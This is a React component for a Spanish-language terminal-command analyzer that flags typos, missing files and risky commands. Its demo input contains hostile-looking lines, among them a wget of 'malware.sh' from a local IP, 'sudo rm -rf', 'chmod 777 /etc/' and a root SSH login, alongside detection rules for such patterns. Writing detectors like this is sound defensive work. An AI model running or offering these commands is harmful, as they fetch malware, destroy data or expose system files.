import React, { useState, useRef } from 'react';
import {
    DocumentTextIcon,
    CloudArrowUpIcon,
    PlayIcon,
    ClipboardDocumentCheckIcon,
    ExclamationTriangleIcon,
    CheckCircleIcon,
    XMarkIcon,
    FolderIcon
} from '@heroicons/react/24/outline';
import SyntaxErrorDisplay from '../../components/analysis/SyntaxErrorDisplay';
import FileSystemErrorDisplay from '../../components/analysis/FileSystemErrorDisplay';

const EnhancedAnalysis = () => {
    const [analysisResult, setAnalysisResult] = useState(null);
    const [isAnalyzing, setIsAnalyzing] = useState(false);
    const [inputText, setInputText] = useState('');
    const [activeTab, setActiveTab] = useState('input');
    const [error, setError] = useState(null);
    const [realTimeErrors, setRealTimeErrors] = useState([]);
    const fileInputRef = useRef(null);

    // Ejemplos de comandos con errores para demostración
    const exampleCommands = `# Comandos con errores sintácticos y del sistema de archivos para probar
suo apt update
sl -la
cd descargas
cat archivo_inexistente.txt
mkdir proyectos
cd proyectos
touch documento.txt
cp archivo_origen.txt destino/
rm archivo_que_no_existe.txt
mv documento.txt carpeta_inexistente/
sudo rm -rf /home/user/temp/*
chmod 777 /etc/
wget http://192.168.1.100/malware.sh
ssh root@10.0.0.1
git clone http://192.168.1.5/suspicious-repo.git`;

    // Validación en tiempo real mientras el usuario escribe
    const validateRealTime = (text) => {
        const lines = text.split('\n').filter(line => line.trim() && !line.trim().startsWith('#'));
        const errors = [];

        lines.forEach((line, index) => {
            const lineNumber = index + 1;
            const trimmedLine = line.trim();

            // Lista de comandos válidos conocidos
            const validCommands = [
                'ls', 'cd', 'pwd', 'cat', 'grep', 'find', 'sudo', 'chmod', 'chown',
                'curl', 'wget', 'ssh', 'git', 'vim', 'nano', 'rm', 'cp', 'mv',
                'mkdir', 'touch', 'echo', 'history', 'clear', 'top', 'ps', 'kill'
            ];

            // Errores comunes conocidos
            const commonErrors = {
                'suo': 'sudo',
                'sl': 'ls',
                'cta': 'cat',
                'grp': 'grep',
                'crul': 'curl',
                'shh': 'ssh',
                'gti': 'git',
                'vmi': 'vim',
                'tpo': 'top',
                'kil': 'kill',
                'celar': 'clear',
                'ehco': 'echo'
            };

            const firstWord = trimmedLine.split(' ')[0];

            // Verificar errores de ortografía
            if (commonErrors[firstWord]) {
                errors.push({
                    line: lineNumber,
                    type: 'spelling',
                    message: `¿Quisiste decir "${commonErrors[firstWord]}" en lugar de "${firstWord}"?`,
                    original: firstWord,
                    suggestion: commonErrors[firstWord],
                    command: trimmedLine
                });
            } else if (!validCommands.includes(firstWord) && firstWord.length > 0) {
                // Buscar comandos similares
                const similar = findSimilarCommand(firstWord, validCommands);
                if (similar) {
                    errors.push({
                        line: lineNumber,
                        type: 'unknown',
                        message: `Comando "${firstWord}" no reconocido. ¿Quisiste decir "${similar}"?`,
                        original: firstWord,
                        suggestion: similar,
                        command: trimmedLine
                    });
                }
            }

            // Verificar patrones de seguridad
            if (trimmedLine.includes('sudo rm -rf')) {
                errors.push({
                    line: lineNumber,
                    type: 'security',
                    level: 'critical',
                    message: 'Comando extremadamente peligroso detectado',
                    command: trimmedLine
                });
            }

            if (trimmedLine.includes('chmod 777')) {
                errors.push({
                    line: lineNumber,
                    type: 'security',
                    level: 'high',
                    message: 'Permisos 777 detectados - riesgo de seguridad',
                    command: trimmedLine
                });
            }

            // Verificar errores del sistema de archivos
            if (trimmedLine.includes('cd ') && !trimmedLine.includes('cd ~') && !trimmedLine.includes('cd /')) {
                const dir = trimmedLine.replace('cd ', '').trim();
                if (!dir.startsWith('/') && dir !== '.' && dir !== '..') {
                    errors.push({
                        line: lineNumber,
                        type: 'filesystem',
                        level: 'medium',
                        message: `Intento de cambiar a directorio "${dir}" que puede no existir`,
                        command: trimmedLine,
                        suggestion: `Considere crear el directorio primero: mkdir ${dir}`
                    });
                }
            }

            // Verificar archivos que pueden no existir
            if (trimmedLine.match(/^(cat|less|more|head|tail|grep)\s+\w/)) {
                errors.push({
                    line: lineNumber,
                    type: 'filesystem',
                    level: 'medium',
                    message: 'Comando intenta leer archivo que puede no existir',
                    command: trimmedLine,
                    suggestion: 'Verifique que el archivo exista o créelo con touch'
                });
            }
        });

        setRealTimeErrors(errors);
    };

    // Función simple para encontrar comandos similares
    const findSimilarCommand = (input, validCommands) => {
        let bestMatch = null;
        let minDistance = Infinity;

        validCommands.forEach(cmd => {
            const distance = levenshteinDistance(input, cmd);
            if (distance <= 2 && distance < minDistance) {
                minDistance = distance;
                bestMatch = cmd;
            }
        });

        return bestMatch;
    };

    // Función de distancia de Levenshtein simplificada
    const levenshteinDistance = (str1, str2) => {
        const matrix = [];
        for (let i = 0; i <= str2.length; i++) {
            matrix[i] = [i];
        }
        for (let j = 0; j <= str1.length; j++) {
            matrix[0][j] = j;
        }
        for (let i = 1; i <= str2.length; i++) {
            for (let j = 1; j <= str1.length; j++) {
                if (str2.charAt(i - 1) === str1.charAt(j - 1)) {
                    matrix[i][j] = matrix[i - 1][j - 1];
                } else {
                    matrix[i][j] = Math.min(
                        matrix[i - 1][j - 1] + 1,
                        matrix[i][j - 1] + 1,
                        matrix[i - 1][j] + 1
                    );
                }
            }
        }
        return matrix[str2.length][str1.length];
    };

    const handleTextChange = (e) => {
        const text = e.target.value;
        setInputText(text);
        validateRealTime(text);
    };

    const handleFileUpload = async (event) => {
        const file = event.target.files[0];
        if (!file) return;

        try {
            const text = await file.text();
            setInputText(text);
            validateRealTime(text);
            setActiveTab('input');
        } catch (err) {
            setError('Error al leer el archivo: ' + err.message);
        }
    };

    const analyzeContent = async () => {
        if (!inputText.trim()) {
            setError('Por favor, ingrese algún contenido para analizar');
            return;
        }

        setIsAnalyzing(true);
        setError(null);

        try {
            const response = await fetch('/api/analyze-text', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    content: inputText
                })
            });

            if (!response.ok) {
                throw new Error(`Error del servidor: ${response.status}`);
            }

            const result = await response.json();
            setAnalysisResult(result);
            setActiveTab('results');
        } catch (err) {
            setError('Error al analizar el contenido: ' + err.message);
        } finally {
            setIsAnalyzing(false);
        }
    };

    const loadExample = () => {
        setInputText(exampleCommands);
        validateRealTime(exampleCommands);
        setActiveTab('input');
    };

    const clearAll = () => {
        setInputText('');
        setAnalysisResult(null);
        setRealTimeErrors([]);
        setError(null);
        setActiveTab('input');
    };

    const applySuggestion = (original, suggestion) => {
        const newText = inputText.replace(new RegExp(`\\b${original}\\b`, 'g'), suggestion);
        setInputText(newText);
        validateRealTime(newText);
    };

    const getErrorTypeColor = (type) => {
        switch (type) {
            case 'spelling':
                return 'border-l-amber-400 bg-amber-50';
            case 'unknown':
                return 'border-l-orange-400 bg-orange-50';
            case 'security':
                return 'border-l-red-400 bg-red-50';
            default:
                return 'border-l-gray-400 bg-gray-50';
        }
    };

    const getSecurityLevelColor = (level) => {
        switch (level) {
            case 'critical':
                return 'text-red-600 bg-red-100';
            case 'high':
                return 'text-orange-600 bg-orange-100';
            case 'medium':
                return 'text-yellow-600 bg-yellow-100';
            default:
                return 'text-gray-600 bg-gray-100';
        }
    };

    return (
        <div className="min-h-screen bg-gray-50 py-8">
            <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
                {/* Header */}
                <div className="text-center mb-8">
                    <h1 className="text-3xl font-bold text-gray-900 mb-4">
                        Analizador de Terminal con Detección Sintáctica
                    </h1>
                    <p className="text-lg text-gray-600">
                        Detecta errores de sintaxis, comandos mal escritos y riesgos de seguridad en tiempo real
                    </p>
                </div>

                {/* Error Global */}
                {error && (
                    <div className="mb-6 bg-red-50 border border-red-200 rounded-lg p-4">
                        <div className="flex">
                            <XMarkIcon className="h-5 w-5 text-red-400 mr-3 mt-0.5" />
                            <p className="text-sm text-red-800">{error}</p>
                        </div>
                    </div>
                )}

                {/* Navegación por pestañas */}
                <div className="mb-6">
                    <div className="border-b border-gray-200">
                        <nav className="-mb-px flex space-x-8">
                            <button
                                onClick={() => setActiveTab('input')}
                                className={`py-2 px-1 border-b-2 font-medium text-sm ${
                                    activeTab === 'input'
                                        ? 'border-primary-500 text-primary-600'
                                        : 'border-transparent text-gray-500 hover:text-gray-700 hover:border-gray-300'
                                }`}
                            >
                                <DocumentTextIcon className="h-5 w-5 inline mr-2" />
                                Entrada y Validación
                                {realTimeErrors.length > 0 && (
                                    <span className="ml-2 bg-red-100 text-red-600 text-xs px-2 py-1 rounded-full">
                                        {realTimeErrors.length}
                                    </span>
                                )}
                            </button>
                            <button
                                onClick={() => setActiveTab('filesystem')}
                                className={`py-2 px-1 border-b-2 font-medium text-sm ${
                                    activeTab === 'filesystem'
                                        ? 'border-primary-500 text-primary-600'
                                        : 'border-transparent text-gray-500 hover:text-gray-700 hover:border-gray-300'
                                }`}
                                disabled={!analysisResult}
                            >
                                <FolderIcon className="h-5 w-5 inline mr-2" />
                                Sistema de Archivos
                                {analysisResult?.filesystem_analysis?.summary?.total_errors > 0 && (
                                    <span className="ml-2 bg-red-100 text-red-600 text-xs px-2 py-1 rounded-full">
                                        {analysisResult.filesystem_analysis.summary.total_errors}
                                    </span>
                                )}
                            </button>
                        </nav>
                    </div>
                </div>

                {/* Contenido de las pestañas */}
                {activeTab === 'input' && (
                    <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
                        {/* Panel de entrada */}
                        <div className="lg:col-span-2 space-y-6">
                            {/* Controles */}
                            <div className="bg-white rounded-lg shadow-sm border p-6">
                                <h2 className="text-xl font-semibold text-gray-900 mb-4">
                                    Entrada de Comandos
                                </h2>

                                <div className="flex flex-wrap gap-3 mb-4">
                                    <button
                                        onClick={() => fileInputRef.current?.click()}
                                        className="inline-flex items-center px-4 py-2 border border-gray-300 rounded-md shadow-sm text-sm font-medium text-gray-700 bg-white hover:bg-gray-50"
                                    >
                                        <CloudArrowUpIcon className="h-4 w-4 mr-2" />
                                        Subir Archivo
                                    </button>
                                    <button
                                        onClick={loadExample}
                                        className="inline-flex items-center px-4 py-2 border border-gray-300 rounded-md shadow-sm text-sm font-medium text-gray-700 bg-white hover:bg-gray-50"
                                    >
                                        <DocumentTextIcon className="h-4 w-4 mr-2" />
                                        Cargar Ejemplo
                                    </button>
                                    <button
                                        onClick={clearAll}
                                        className="inline-flex items-center px-4 py-2 border border-gray-300 rounded-md shadow-sm text-sm font-medium text-gray-700 bg-white hover:bg-gray-50"
                                    >
                                        <XMarkIcon className="h-4 w-4 mr-2" />
                                        Limpiar Todo
                                    </button>
                                </div>

                                <input
                                    type="file"
                                    ref={fileInputRef}
                                    onChange={handleFileUpload}
                                    accept=".txt,.log,.history"
                                    className="hidden"
                                />

                                <div className="relative">
                                    <textarea
                                        value={inputText}
                                        onChange={handleTextChange}
                                        placeholder="Ingrese los comandos de terminal aquí, uno por línea..."
                                        className="w-full h-64 p-4 border border-gray-300 rounded-lg font-mono text-sm resize-none focus:ring-2 focus:ring-primary-500 focus:border-primary-500"
                                    />

                                    {/* Indicador de líneas */}
                                    <div className="absolute left-2 top-4 text-xs text-gray-400 font-mono leading-5 pointer-events-none">
                                        {inputText.split('\n').map((_, index) => (
                                            <div key={index}>{index + 1}</div>
                                        ))}
                                    </div>
                                </div>

                                <div className="mt-4 flex justify-between items-center">
                                    <div className="text-sm text-gray-500">
                                        {inputText.split('\n').filter(line => line.trim()).length} líneas,{' '}
                                        {inputText.length} caracteres
                                    </div>
                                    <button
                                        onClick={analyzeContent}
                                        disabled={!inputText.trim() || isAnalyzing}
                                        className="inline-flex items-center px-6 py-2 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-primary-600 hover:bg-primary-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-primary-500 disabled:opacity-50 disabled:cursor-not-allowed"
                                    >
                                        {isAnalyzing ? (
                                            <>
                                                <svg className="animate-spin -ml-1 mr-3 h-4 w-4 text-white" fill="none" viewBox="0 0 24 24">
                                                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                                                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                                                </svg>
                                                Analizando...
                                            </>
                                        ) : (
                                            <>
                                                <PlayIcon className="h-4 w-4 mr-2" />
                                                Analizar Comandos
                                            </>
                                        )}
                                    </button>
                                </div>
                            </div>
                        </div>

                        {/* Panel de errores en tiempo real */}
                        <div className="space-y-6">
                            <div className="bg-white rounded-lg shadow-sm border p-6">
                                <h3 className="text-lg font-semibold text-gray-900 mb-4 flex items-center">
                                    {realTimeErrors.length > 0 ? (
                                        <ExclamationTriangleIcon className="h-5 w-5 text-red-500 mr-2" />
                                    ) : (
                                        <CheckCircleIcon className="h-5 w-5 text-green-500 mr-2" />
                                    )}
                                    Validación en Tiempo Real
                                </h3>

                                {realTimeErrors.length === 0 ? (
                                    <div className="text-center py-8">
                                        <CheckCircleIcon className="h-12 w-12 text-green-400 mx-auto mb-3" />
                                        <p className="text-sm text-gray-500">
                                            No se detectaron errores sintácticos
                                        </p>
                                    </div>
                                ) : (
                                    <div className="space-y-3 max-h-96 overflow-y-auto">
                                        {realTimeErrors.map((error, index) => (
                                            <div
                                                key={index}
                                                className={`p-3 rounded-lg border-l-4 ${getErrorTypeColor(error.type)}`}
                                            >
                                                <div className="flex items-start justify-between">
                                                    <div className="flex-1">
                                                        <div className="flex items-center mb-1">
                                                            <span className="text-xs font-medium text-gray-600">
                                                                Línea {error.line}
                                                            </span>
                                                            {error.level && (
                                                                <span className={`ml-2 px-2 py-1 text-xs font-medium rounded ${getSecurityLevelColor(error.level)}`}>
                                                                    {error.level.toUpperCase()}
                                                                </span>
                                                            )}
                                                        </div>
                                                        <p className="text-sm text-gray-800 mb-2">{error.message}</p>
                                                        <code className="text-xs bg-gray-100 p-1 rounded block">
                                                            {error.command}
                                                        </code>
                                                        {error.suggestion && (
                                                            <button
                                                                onClick={() => applySuggestion(error.original, error.suggestion)}
                                                                className="mt-2 text-xs text-primary-600 hover:text-primary-800 font-medium"
                                                            >
                                                                ✓ Aplicar sugerencia: {error.suggestion}
                                                            </button>
                                                        )}
                                                    </div>
                                                </div>
                                            </div>
                                        ))}
                                    </div>
                                )}
                            </div>
                        </div>
                    </div>
                )}

                {/* Pestaña del sistema de archivos */}
                {activeTab === 'filesystem' && (
                    <div className="space-y-6">
                        {analysisResult ? (
                            <>
                                <div className="bg-white rounded-lg shadow-sm border p-6">
                                    <h2 className="text-xl font-semibold text-gray-900 mb-6">
                                        Análisis Completo del Sistema de Archivos
                                    </h2>
                                    <FileSystemErrorDisplay fileSystemAnalysis={analysisResult.filesystem_analysis} />
                                </div>
                            </>
                        ) : (
                            <div className="bg-white rounded-lg shadow-sm border p-12 text-center">
                                <FolderIcon className="h-16 w-16 text-gray-300 mx-auto mb-4" />
                                <h3 className="text-lg font-medium text-gray-900 mb-2">
                                    No hay análisis del sistema de archivos
                                </h3>
                                <p className="text-gray-500 mb-4">
                                    Ejecute un análisis para ver los errores del sistema de archivos aquí.
                                </p>
                                <button
                                    onClick={() => setActiveTab('input')}
                                    className="inline-flex items-center px-4 py-2 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-primary-600 hover:bg-primary-700"
                                >
                                    Ir a Entrada
                                </button>
                            </div>
                        )}
                    </div>
                )}

                {/* Pestaña de resultados */}
                {activeTab === 'results' && (
                    <div className="space-y-6">
                        {analysisResult ? (
                            <>
                                {/* Resumen */}
                                <div className="bg-white rounded-lg shadow-sm border p-6">
                                    <h2 className="text-xl font-semibold text-gray-900 mb-4">
                                        Resumen del Análisis
                                    </h2>
                                    <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                                        <div className="text-center">
                                            <div className="text-2xl font-bold text-gray-900">
                                                {analysisResult.summary?.total_commands || 0}
                                            </div>
                                            <div className="text-sm text-gray-500">Comandos Total</div>
                                        </div>
                                        <div className="text-center">
                                            <div className="text-2xl font-bold text-red-600">
                                                {analysisResult.syntax_analysis?.parse_errors?.length || 0}
                                            </div>
                                            <div className="text-sm text-gray-500">Errores Sintácticos</div>
                                        </div>
                                        <div className="text-center">
                                            <div className="text-2xl font-bold text-yellow-600">
                                                {analysisResult.syntax_analysis?.warnings?.length || 0}
                                            </div>
                                            <div className="text-sm text-gray-500">Advertencias</div>
                                        </div>
                                        <div className="text-center">
                                            <div className="text-2xl font-bold text-blue-600">
                                                {analysisResult.semantic_analysis?.threats?.length || 0}
                                            </div>
                                            <div className="text-sm text-gray-500">Amenazas</div>
                                        </div>
                                    </div>
                                </div>

                                {/* Análisis Sintáctico Detallado */}
                                <div className="bg-white rounded-lg shadow-sm border p-6">
                                    <h2 className="text-xl font-semibold text-gray-900 mb-6">
                                        Análisis Sintáctico Detallado
                                    </h2>
                                    <SyntaxErrorDisplay syntaxAnalysis={analysisResult.syntax_analysis} />
                                </div>

                                {/* Análisis del Sistema de Archivos */}
                                <div className="bg-white rounded-lg shadow-sm border p-6">
                                    <h2 className="text-xl font-semibold text-gray-900 mb-6">
                                        Análisis del Sistema de Archivos
                                    </h2>
                                    <FileSystemErrorDisplay fileSystemAnalysis={analysisResult.filesystem_analysis} />
                                </div>

                                {/* Otros análisis existentes... */}
                                {/* Aquí irían los componentes existentes para análisis léxico y semántico */}
                            </>
                        ) : (
                            <div className="bg-white rounded-lg shadow-sm border p-12 text-center">
                                <DocumentTextIcon className="h-16 w-16 text-gray-300 mx-auto mb-4" />
                                <h3 className="text-lg font-medium text-gray-900 mb-2">
                                    No hay resultados de análisis
                                </h3>
                                <p className="text-gray-500 mb-4">
                                    Ingrese comandos en la pestaña de entrada y ejecute el análisis para ver los resultados aquí.
                                </p>
                                <button
                                    onClick={() => setActiveTab('input')}
                                    className="inline-flex items-center px-4 py-2 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-primary-600 hover:bg-primary-700"
                                >
                                    Ir a Entrada
                                </button>
                            </div>
                        )}
                    </div>
                )}
            </div>
        </div>
    );
};

export default EnhancedAnalysis;